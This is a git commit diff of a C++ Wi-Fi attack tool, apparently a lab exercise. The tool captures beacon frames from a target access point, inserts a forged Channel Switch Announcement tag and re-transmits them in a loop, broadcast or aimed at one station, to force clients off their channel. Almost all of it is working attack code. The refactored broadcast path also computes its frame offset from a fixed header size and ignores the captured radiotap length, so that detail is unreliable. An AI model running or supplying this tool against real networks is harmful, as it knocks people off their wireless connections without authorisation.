580338972910bd5e0c7b7cc67b0fabdad257f783
KoYejune0302 <koyejune0320@gmail.com>
2025-02-10 19:49:56 +0900

    Refactor: improve MAC address handling, add beacon frame detection, and update data structures

--- csa_attack.cpp
+++ csa_attack.cpp
@@ -1,8 +1,8 @@
 #include "csa_attack.h"
 
 void usage() {
-    printf("syntax: ./csa <interface> <ap mac> [<station mac>]\n");
-    printf("sample: ./csa mon0 01:23:45:67:89:AB 01:23:45:67:89:AB\n");
+    printf("syntax: ./csa <interface> <apMAC> [<StationMac>]\n");
+    printf("sample: ./csa wlan0 88:88:88:88:88:88 99:99:99:99:99:99\n");
 }
 
 bool parse(char** interface, char** ap_mac, char** station_mac, int argc, char* argv[]) {
@@ -18,6 +18,71 @@ bool parse(char** interface, char** ap_mac, char** station_mac, int argc, char* 
         *station_mac = nullptr;
     }
     return true;
+}
+
+bool is_beacon_frame(const u_char* packet, size_t packet_len) {
+    if (packet_len < sizeof(struct RadiotapHeader) + sizeof(struct IEEE80211Header)) {
+        std::cerr << "Packet too short to be a beacon frame" << std::endl;
+        return false;
+    }
+
+    struct RadiotapHeader* rheader = (struct RadiotapHeader*)packet;
+    if (rheader->version != 0) {
+        std::cerr << "Invalid radiotap header version" << std::endl;
+        return false;
+    }
+
+    struct IEEE80211Header* ieee_header = (struct IEEE80211Header*)(packet + rheader->len);
+    uint16_t frame_control = ntohs(ieee_header->frame_control);
+
+    // Check if the frame is a beacon frame
+    bool is_beacon = (frame_control & 0xFF00) == 0x8000;
+    // if (!is_beacon) {
+    //     std::cerr << "Frame is not a beacon frame, frame_control: " << std::hex << frame_control << std::dec << std::endl;
+    // }
+
+    return is_beacon;
+}
+
+bool match_ap_mac(const u_char* packet, const char* ap_mac) {
+    struct RadiotapHeader* rheader = (struct RadiotapHeader*)packet;
+    struct IEEE80211Header* ieee_header = (struct IEEE80211Header*)(packet + rheader->len);
+
+    uint8_t ap_mac_bytes[6];
+    std::istringstream apMacStream(ap_mac);
+    int value;
+    char colon;
+
+    for (int i = 0; i < 6; ++i) {
+        if (!(apMacStream >> std::hex >> value)) {
+            std::cerr << "MAC address parsing failed: invalid format" << std::endl;
+            exit(EXIT_FAILURE);
+        }
+        if (i < 5 && !(apMacStream >> colon)) {
+            std::cerr << "MAC address parsing failed: delimiter error" << std::endl;
+            exit(EXIT_FAILURE);
+        }
+        if (value < 0 || value > 255) {
+            std::cerr << "MAC address parsing failed: value out of range" << std::endl;
+            exit(EXIT_FAILURE);
+        }
+        ap_mac_bytes[i] = static_cast<uint8_t>(value);
+    }
+
+    // // Print the MAC addresses for debugging
+    // std::cerr << "AP MAC from packet: ";
+    // for (int i = 0; i < 6; ++i) {
+    //     std::cerr << std::hex << (int)ieee_header->src_addr[i] << ":";
+    // }
+    // std::cerr << std::dec << std::endl;
+
+    // std::cerr << "AP MAC from argument: ";
+    // for (int i = 0; i < 6; ++i) {
+    //     std::cerr << std::hex << (int)ap_mac_bytes[i] << ":";
+    // }
+    // std::cerr << std::dec << std::endl;
+
+    return memcmp(ieee_header->src_addr, ap_mac_bytes, 6) == 0;
 }
 
 int main(int argc, char* argv[]) {
@@ -45,10 +110,13 @@ int main(int argc, char* argv[]) {
             break;
         }
 
-        if (station_mac != nullptr) {
-            unicast(interface, packet, ap_mac, header->caplen, station_mac);
-        } else {
-            broadcast(interface, packet, ap_mac, header->caplen);
+        if (is_beacon_frame(packet, header->caplen) && match_ap_mac(packet, ap_mac)) {
+            printf("Beacon frame detected\n");
+            if (station_mac != nullptr) {
+                unicast(interface, packet, ap_mac, header->caplen, station_mac);
+            } else {
+                broadcast(interface, packet, ap_mac, header->caplen);
+            }
         }
     }
 
--- csa_attack.h
+++ csa_attack.h
@@ -13,83 +13,93 @@
 #include <thread>
 #include <chrono>
 
-struct ieee80211_radiotap_header {
-    u_int8_t        it_version;     /* set to 0 */
-    u_int8_t        it_pad;
-    u_int16_t       it_len;         /* entire length */
+// IEEE 802.11 Radiotap Header
+struct RadiotapHeader {
+    u_int8_t version;     // set to 0
+    u_int8_t pad;
+    u_int16_t len;        // entire length
 } __attribute__((__packed__));
 
-struct ieee80211_header {
+// IEEE 802.11 Header
+struct IEEE80211Header {
     uint16_t frame_control;
     uint16_t duration_id;
-    uint8_t desaddr[6];
-    uint8_t sourceaddr4[6];
+    uint8_t dest_addr[6];
+    uint8_t src_addr[6];
     uint8_t bssid[6];
     uint16_t sequence_control;
 };
 
-struct beacon_frame_fixed {
+// Beacon Frame Fixed Parameters
+struct BeaconFrameFixed {
     uint8_t timestamp[8];
     uint8_t beacon_interval[2];
     uint8_t capabilities_info[2];
 };
 
-struct info_element {
+// Information Element
+struct InfoElement {
     uint8_t id;
     uint8_t length;
     uint8_t data[];
 };
 
-struct beacon_frame {
-    struct ieee80211_header header;
-    struct beacon_frame_fixed fixed;
-    struct info_element ie[];
+// Beacon Frame
+struct BeaconFrame {
+    struct IEEE80211Header header;
+    struct BeaconFrameFixed fixed;
+    struct InfoElement ie[];
 };
 
-struct csa {
+// Channel Switch Announcement (CSA) Tag
+struct CSA {
     uint8_t tag_number = 0x25;
     uint8_t tag_len = 0x03;
     uint8_t channelswitch = 0x01;
-    uint8_t new_channel = 0x06;
+    uint8_t new_channel = 0x13;
     uint8_t channel_switch_count = 0x03;
 };
 
+// Function to send packet with inserted CSA tag
 void send_packet_with_inserted_csa(const std::string& dev, const u_char* packet, size_t packet_len, size_t offset) {
-    struct csa csa_data;
+    struct CSA csa_data;
     char errbuf[PCAP_ERRBUF_SIZE];
-    size_t new_packet_len = packet_len + sizeof(struct csa);
+    size_t new_packet_len = packet_len + sizeof(struct CSA);
     size_t insert_position = -1;
     uint8_t channel = 0x00;
 
+    // Open pcap handle for sending packets
     pcap_t* sendhandle = pcap_open_live(dev.c_str(), BUFSIZ, 1, 1000, errbuf);
     if (sendhandle == NULL) {
         std::cerr << "Couldn't open device " << dev << ": " << errbuf << std::endl;
         return;
     }
 
+    // Traverse the packet to find the insertion position
     while (offset < packet_len) {
-        struct info_element* ie = (struct info_element*)(packet + offset);
+        struct InfoElement* ie = (struct InfoElement*)(packet + offset);
         size_t next_offset = offset + 2 + ie->length;
         if (ie->id == 3 && ie->length == 1) {
             channel = (ie->data[0]) * 2;
         }
 
         if (next_offset < packet_len) {
-            struct info_element* next_ie = (struct info_element*)(packet + next_offset);
+            struct InfoElement* next_ie = (struct InfoElement*)(packet + next_offset);
             if (ie->id <= 0x25 && next_ie->id > 0x25) {
                 insert_position = next_offset;
-                csa_data.new_channel = channel;
+                csa_data.new_channel = (channel == 6) ? 11 : 6;
                 break;
             }
         }
         offset = next_offset;
     }
 
+    // Insert CSA tag and send packet
     if (insert_position != static_cast<size_t>(-1)) {
         std::vector<u_char> new_packet;
         new_packet.reserve(new_packet_len);
         new_packet.insert(new_packet.end(), packet, packet + insert_position);
-        new_packet.insert(new_packet.end(), reinterpret_cast<u_char*>(&csa_data), reinterpret_cast<u_char*>(&csa_data) + sizeof(struct csa));
+        new_packet.insert(new_packet.end(), reinterpret_cast<u_char*>(&csa_data), reinterpret_cast<u_char*>(&csa_data) + sizeof(struct CSA));
         new_packet.insert(new_packet.end(), packet + insert_position, packet + packet_len);
 
         while (true) {
@@ -105,77 +115,18 @@ void send_packet_with_inserted_csa(const std::string& dev, const u_char* packet,
     pcap_close(sendhandle);
 }
 
+// Function to broadcast CSA packet
 void broadcast(char* adp, const u_char* packet, char* apmac, uint32_t caplen) {
-    uint8_t send[6];
-    int status = 0;
-
-    std::istringstream apMacStream(apmac);
-    int value;
-    char colon;
-
-    for (int i = 0; i < 6; ++i) {
-        if (!(apMacStream >> std::hex >> value)) {
-            std::cerr << "MAC address parsing failed: invalid format" << std::endl;
-            exit(EXIT_FAILURE);
-        }
-        if (i < 5 && !(apMacStream >> colon)) {
-            std::cerr << "MAC address parsing failed: delimiter error" << std::endl;
-            exit(EXIT_FAILURE);
-        }
-        if (value < 0 || value > 255) {
-            std::cerr << "MAC address parsing failed: value out of range" << std::endl;
-            exit(EXIT_FAILURE);
-        }
-        send[i] = static_cast<uint8_t>(value);
-    }
-
-    struct ieee80211_radiotap_header *rheader = (struct ieee80211_radiotap_header*)packet;
-    struct beacon_frame *beacon = (struct beacon_frame*)(packet + (rheader->it_len));
-    int x = packet[rheader->it_len];
-
-    if (x != 0x80)
-        return;
-
-    for (int i = 0; i < 6; i++) {
-        if (send[i] != beacon->header.sourceaddr4[i])
-            status++;
-    }
-
-    if (status != 0)
-        return;
-
-    size_t beacon_frame_offset = rheader->it_len + sizeof(struct ieee80211_header) + sizeof(struct beacon_frame_fixed);
+    size_t beacon_frame_offset = sizeof(struct RadiotapHeader) + sizeof(struct IEEE80211Header) + sizeof(struct BeaconFrameFixed);
     send_packet_with_inserted_csa(adp, packet, caplen, beacon_frame_offset);
 }
 
+// Function to unicast CSA packet
 void unicast(char* adp, const u_char* packet, char* apmac, uint32_t caplen, char* stationmac) {
-    uint8_t send[6];
     uint8_t des[6];
-    int status = 0;
-
-    std::istringstream apMacStream(apmac);
     std::istringstream stationMacStream(stationmac);
     int value;
     char colon;
-
-    for (int i = 0; i < 6; ++i) {
-        if (!(apMacStream >> std::hex >> value)) {
-            std::cerr << "MAC address parsing failed: invalid format" << std::endl;
-            exit(EXIT_FAILURE);
-        }
-        if (i < 5 && !(apMacStream >> colon)) {
-            std::cerr << "MAC address parsing failed: delimiter error" << std::endl;
-            exit(EXIT_FAILURE);
-        }
-        if (value < 0 || value > 255) {
-            std::cerr << "MAC address parsing failed: value out of range" << std::endl;
-            exit(EXIT_FAILURE);
-        }
-        send[i] = static_cast<uint8_t>(value);
-    }
-
-    value = 0;
-    colon = 0;
 
     for (int i = 0; i < 6; ++i) {
         if (!(stationMacStream >> std::hex >> value)) {
@@ -193,35 +144,23 @@ void unicast(char* adp, const u_char* packet, char* apmac, uint32_t caplen, char
         des[i] = static_cast<uint8_t>(value);
     }
 
-    struct ieee80211_radiotap_header *rheader = (struct ieee80211_radiotap_header*)packet;
-    struct beacon_frame *beacon = (struct beacon_frame*)(packet + (rheader->it_len));
-    int x = packet[rheader->it_len];
-
-    if (x != 0x80)
-        return;
-
-    for (int i = 0; i < 6; i++) {
-        if (send[i] != beacon->header.sourceaddr4[i])
-            status++;
-    }
-
-    if (status != 0)
-        return;
+    struct RadiotapHeader *rheader = (struct RadiotapHeader*)packet;
+    struct BeaconFrame *beacon = (struct BeaconFrame*)(packet + (rheader->len));
 
     std::vector<u_char> new_packet;
     new_packet.reserve(caplen);
 
-    new_packet.insert(new_packet.end(), packet, packet + rheader->it_len);
+    new_packet.insert(new_packet.end(), packet, packet + rheader->len);
 
-    struct beacon_frame new_beacon_frame = *beacon;
-    memcpy(new_beacon_frame.header.desaddr, des, 6);
+    struct BeaconFrame new_beacon_frame = *beacon;
+    memcpy(new_beacon_frame.header.dest_addr, des, 6);
 
     const u_char* beacon_ptr = reinterpret_cast<const u_char*>(&new_beacon_frame);
     new_packet.insert(new_packet.end(), beacon_ptr, beacon_ptr + sizeof(new_beacon_frame));
 
-    size_t beacon_end_offset = rheader->it_len + sizeof(new_beacon_frame);
+    size_t beacon_end_offset = rheader->len + sizeof(new_beacon_frame);
     new_packet.insert(new_packet.end(), packet + beacon_end_offset, packet + caplen);
 
-    size_t beacon_frame_offset = rheader->it_len + sizeof(struct ieee80211_header) + sizeof(struct beacon_frame_fixed);
+    size_t beacon_frame_offset = rheader->len + sizeof(struct IEEE80211Header) + sizeof(struct BeaconFrameFixed);
     send_packet_with_inserted_csa(adp, new_packet.data(), new_packet.size(), beacon_frame_offset);
 }
